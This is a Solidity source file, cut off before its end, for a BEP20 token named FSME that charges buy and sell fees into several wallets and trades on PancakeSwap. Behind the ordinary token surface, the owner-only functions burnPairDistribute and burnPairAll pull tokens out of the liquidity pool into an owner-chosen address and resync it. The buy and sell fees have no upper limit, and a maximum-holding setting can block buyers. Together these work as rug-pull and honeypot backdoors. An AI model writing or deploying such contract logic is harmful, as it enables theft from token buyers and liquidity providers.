contract FSME is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router01 public uniswapV2Router;
    address public uniswapV2Pair;

    uint256[4] public buyFee = [4, 1, 1, 1];
    uint256[4] public sellFee = [4, 1, 1, 1];
    uint256[1] public transFee = [0];
    uint256[2] public burnScale = [0, 100];

    uint256 private _maxAmount;

    address public _recommendAddress;
    address public _shareholderAddress;
    address public _partnerAddress;
    address public _salonAddress;
    address public _lpAddress;
    address public _transferAddress;
    address public _blackholeAddress =
        0x000000000000000000000000000000000000dEaD;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public automatedMarketMakerPairs;
    bool public lpBurnEnabled = true;
    uint256 public lastLpBurnTime;

    event UpdateUniswapV2Router(
        address indexed newAddress,
        address indexed oldAddress
    );
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 totalSupply_,
        address[6] memory walletAddr_,
        uint256 maxAmount_
    ) payable ERC20(name_, symbol_, decimals_) {
        _recommendAddress = walletAddr_[0];
        _shareholderAddress = walletAddr_[1];
        _partnerAddress = walletAddr_[2];
        _salonAddress = walletAddr_[3];
        _lpAddress = walletAddr_[4];
        _transferAddress = walletAddr_[5];
        _maxAmount = maxAmount_ * (10 ** decimals_);

        uint256 totalSupply = totalSupply_ * (10 ** decimals_);

        IUniswapV2Router01 _uniswapV2Router = IUniswapV2Router01(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(
                address(this),
                0x55d398326f99059fF775485246999027B3197955
            );
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);

        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(_recommendAddress, true);
        excludeFromFees(_shareholderAddress, true);
        excludeFromFees(_partnerAddress, true);
        excludeFromFees(_salonAddress, true);
        excludeFromFees(_lpAddress, true);
        excludeFromFees(_transferAddress, true);
        excludeFromFees(_blackholeAddress, true);

        _Cast(owner(), totalSupply);
    }

    receive() external payable {}

    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(
            newAddress != address(uniswapV2Router),
            "The router already has that address"
        );
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router01(newAddress);
        address _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(
                address(this),
                0x55d398326f99059fF775485246999027B3197955
            );
        uniswapV2Pair = _uniswapV2Pair;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        if (_isExcludedFromFees[account] != excluded) {
            _isExcludedFromFees[account] = excluded;
            emit ExcludeFromFees(account, excluded);
        }
    }

    function excludeMultipleAccountsFromFees(
        address[] calldata accounts,
        bool excluded
    ) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
        }
        emit ExcludeMultipleAccountsFromFees(accounts, excluded);
    }

    function setRecommendAddress(address wallet) external onlyOwner {
        _recommendAddress = wallet;
    }

    function setShareholderAddress(address wallet) external onlyOwner {
        _shareholderAddress = wallet;
    }

    function setPartnerAddress(address wallet) external onlyOwner {
        _partnerAddress = wallet;
    }

    function setSalonAddress(address wallet) external onlyOwner {
        _salonAddress = wallet;
    }

    function setLpAddress(address wallet) external onlyOwner {
        _lpAddress = wallet;
    }

    function setTransferAddress(address wallet) external onlyOwner {
        _transferAddress = wallet;
    }

    function setMaxAmount(uint256 amount) public onlyOwner {
        _maxAmount = amount * (10 ** 18);
    }

    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) public onlyOwner {
        require(
            pair != uniswapV2Pair,
            "The PancakeSwap pair cannot be removed from automatedMarketMakerPairs"
        );
        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(
            automatedMarketMakerPairs[pair] != value,
            "Automated market maker pair is already set to that value"
        );
        automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function setBuyFee(uint256[] calldata settings) public onlyOwner {
        if (settings.length == 4) {
            for (uint256 i = 0; i < settings.length; i++) {
                buyFee[i] = settings[i];
            }
        }
    }

    function setSellFee(uint256[] calldata settings) public onlyOwner {
        if (settings.length == 4) {
            for (uint256 i = 0; i < settings.length; i++) {
                sellFee[i] = settings[i];
            }
        }
    }

    function setTransFee(uint256[] calldata settings) public onlyOwner {
        if (settings.length == 1) {
            for (uint256 i = 0; i < settings.length; i++) {
                transFee[i] = settings[i];
            }
        }
    }

    function setBurnScale(uint256[] calldata settings) public onlyOwner {
        if (settings.length == 2) {
            for (uint256 i = 0; i < settings.length; i++) {
                burnScale[i] = settings[i];
            }
        }
    }

    function setLpBurnEnabled(bool lpBurnEnabled_) public onlyOwner {
        lpBurnEnabled = lpBurnEnabled_;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
        if (!_isExcludedFromFees[to] && !automatedMarketMakerPairs[to]) {
            require(
                balanceOf(to).add(amount) <= _maxAmount,
                "BEP20: Trigger max limit"
            );
        }
        bool takeFee = true;
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }
        if (takeFee) {
            uint256 totalFees;
            uint256 RF;
            uint256 SF;
            uint256 PF;
            uint256 SLF;
            uint256 TF;
            if (automatedMarketMakerPairs[from]) {
                RF = amount.mul(buyFee[0]).div(100);
                SF = amount.mul(buyFee[1]).div(100);
                PF = amount.mul(buyFee[2]).div(100);
                SLF = amount.mul(buyFee[3]).div(100);
                totalFees = RF.add(SF).add(PF).add(SLF);
                if (totalFees > 0) amount = amount.sub(totalFees);
                if (RF > 0) super._transfer(from, _recommendAddress, RF);
                if (SF > 0) super._transfer(from, _shareholderAddress, SF);
                if (PF > 0) super._transfer(from, _partnerAddress, PF);
                if (SLF > 0) super._transfer(from, _salonAddress, SLF);
            } else if (automatedMarketMakerPairs[to]) {
                RF = amount.mul(sellFee[0]).div(100);
                SF = amount.mul(sellFee[1]).div(100);
                PF = amount.mul(sellFee[2]).div(100);
                SLF = amount.mul(sellFee[3]).div(100);
                totalFees = RF.add(SF).add(PF).add(SLF);
                if (totalFees > 0) amount = amount.sub(totalFees);
                if (RF > 0) super._transfer(from, _recommendAddress, RF);
                if (SF > 0) super._transfer(from, _shareholderAddress, SF);
                if (PF > 0) super._transfer(from, _partnerAddress, PF);
                if (SLF > 0) super._transfer(from, _salonAddress, SLF);
            } else {
                TF = amount.mul(transFee[0]).div(100);
                totalFees = TF;
                if (totalFees > 0) amount = amount.sub(totalFees);
                if (TF > 0) super._transfer(from, _transferAddress, TF);
            }
        }
        super._transfer(from, to, amount);
    }

    function burnPairDistribute(uint256 amount) public onlyOwner {
        if (!lpBurnEnabled) return;
        lastLpBurnTime = block.timestamp;
        uint256 liquidityPairBalance = balanceOf(uniswapV2Pair);
        if (liquidityPairBalance == 0) return;
        if (liquidityPairBalance.sub(amount) <= 0) return;

        uint256 deadAmount = amount.mul(50).div(100);
        uint256 lpAmount = amount.mul(50).div(100);
        if (deadAmount > 0) {
            super._transfer(uniswapV2Pair, _blackholeAddress, deadAmount);
        }
        if (lpAmount > 0) {
            super._transfer(uniswapV2Pair, _lpAddress, lpAmount);
        }
        IUniswapV2Pair(uniswapV2Pair).sync();
    }

    function burnPairAll(uint256 amount) public onlyOwner {
        if (!lpBurnEnabled) return;
        lastLpBurnTime = block.timestamp;
        uint256 liquidityPairBalance = balanceOf(uniswapV2Pair);
        if (liquidityPairBalance == 0) return;
        if (liquidityPairBalance.sub(amount) <= 0) return;

        uint256 deadAmount = amount.mul(burnScale[0]).div(100);
        uint256 lpAmount = amount.mul(burnScale[1]).div(100);
        if (deadAmount > 0) {
            super._transfer(uniswapV2Pair, _blackholeAddress, deadAmount);
        }
        if (lpAmount > 0) {
            super._transfer(uniswapV2Pair, _lpAddress, lpAmount);
        }
        IUniswapV2Pair(uniswapV2Pair).sync();
    }
